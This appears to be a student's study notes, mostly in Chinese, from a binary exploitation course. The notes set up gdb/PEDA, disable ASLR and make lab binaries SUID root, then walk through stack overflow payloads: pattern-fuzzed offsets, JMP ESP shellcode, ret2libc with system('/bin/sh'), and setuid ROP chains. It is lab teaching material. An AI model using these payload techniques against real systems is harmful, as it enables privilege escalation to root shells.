ROP
===


```C
#include<stdio.h>

in main(void)
{
    printf("Hello World!");
    return;
}
```
windows
> 檔案對、設定也要對
> MS Visual C Runtime(msvcrt.dll)
> C++可轉發套件  msvcrt.dll
> installer packager打包
> 
> cygwin : 把整個Linux的開發環境(Runtime)原封不動的跑到windows底下執行

Linux
> Gun C Library(glibc.so)
> 
> Wine(Wine is not an Emulator) : 把Windows執行環境(Runtime)搬到Linux


# InMemory
```
# 這個記憶體分布不是真的 是虛擬記憶體VMM
2**32 = 4G
2**64 = 
```

# 開始
```bash
strings crackme0x00a | grep GLIBC
# 快速看出這個程式使用的runtime函數


rabin2 -z  crackme0x00a
# 把data區段的資料秀出來
# rodata 嵌在函數裡面的
# data   指標之類的


# PEDA考試的時候可以自己安裝
gdb -q ./crackme0x00a
# 進gdb
checksec
disassemble main

x/s 0x8048640
x/s 0x804a024

b *main+70

# eax 執行前用來設定參數，執行後是用來放執行結果


Intel小端序(x86) ->[]定址

AT&T大端序->()定址 mov a,b     # mov a to b
```




# StackFrame
Stack
```bash
# Save EBP往上開始才是新的stack frame



Local Var  
#<---New Function Frame
Save EBP
ret addr
Arg1
Arg2
# ----main----


```
shellcode
```bash
# ASLR
sysctl -a --pattern randomize

# close
sudo sysctl -w kernel.randomize_va_space=0


cat ~/examples/samplecode/shellcode.c
# ll /bin/sh --> dash

gcc shellcode.c -z execstack -o shellcode
sudo chown root:root shellcode
sudo chmod 4755 shellcode
# result : bash


# test
sudo cp /bin/bash .
sudo chmod 4755 bash
./bash  # student
./bash -p # root


# why
# 當ruid(real) != euid(effective) => Drop
# 所以需要-p

# 問題回到shellcode
# suid shellcode
# setuid setgid shellcode
https://shell-storm.org/shellcode/files/shellcode-251.html

# cd 80 => call =>大量密集出現的時候是shellcode的機會很高
history 
!885  #執行某個歷史紀錄
```
stack.c
```bash
# strcpy
gcc stack.c -z execstack -fno-stack-protector -o stack


gdb -q stack
# gdb
checksec
disassemble main
r # no such file or directory
b *main+55 # badfile
# touch badfile


# FUZZING
python -c 'print "A"*300' > badfile

pattern create 300 badfile
pattern search #崩掉後 >> 42

# paylaod
python -c 'print "A"*42  + "B"*4 + "C"*64 ' > badfile
cat shellcode.c | grep '"' | cut'"' -f2,4 | tr -d '\n' | tr -d '"'
python -c 'print "A"*42  + "B"*4 + $換成上面輸出的binarycode ' > badfile
xxd badfile
# 都ret了 esp就指在shellcode上  >>> JMP ESP


# find jmp esp
# gdb
gdb-peda$ jmpcall jmpesp  #no find
# 去記憶體找
gdb-peda$ vmmp
gdb-peda$ jmpcall jmpesp /lib/i386-linux-gnu/libc-2.23.so

# asmsearch "jmp esp" libc

# change paylaod
# "\x90"*8 偏移修正
python -c 'print "A"*42  + "\xa9\x8a\xe0\xb7" + "\x90"*8 + $換成上面輸出的binarycode ' > badfile


# compile
sudo chown root:root stack
sudo chmod 4755 stack


```


downlaod retlib.c
```bash
gcc retlib.c -o retlib -fno-stack-protector
sudo chown root:root retlib
sudo chmod 4755 retlib
echo > badfile


# gdb
checksec
disassemble main
disassemble bof

# FUZZING
pattern create 300 badfile
pattern search #崩掉後 >> 24

python -c 'print "A"*24 + "BBBB" + "C"*128 '

# shellcode 本質
system("/bin/sh");
-> in libc


# gdb
p system     #找位置
p exit       #找位置
find /bin/sh #找字串

*system + *exit + *(/bin/sh))
          (retaddr)
python -c 'print "A"*24 + paylpad  '

```


ROP (NX)
```bash
p setgid-setuid

# payload chain
setuid + [ret] + 0 +
setuid + [ret] + 0 +
system


ropgadget
> popret
```

static linling(VM parrot)-bin1
```bash
# challenge-one
gdb -q challenge-one
# gdb
checksec
disassemble main
disassemble bof

# FUZZING
pattern create 300 
pattern search 


# static linking 沒朋友
vmmap


# vulnhub  第一題
# mprotect  read

# mprotect 可以改變執行區段的權限
ldd bin2/level-two | grep libc # ASLR

# 32位元ASLR 直接幹256次
```
bin2-level2
```bash
sudo chown root:root level-two
sudo chmod 4755 level-two

gdb -q level-two
# gdb
checksec
disassemble main
disassemble bof

# FUZZING
pattern create 300 
pattern search 
```






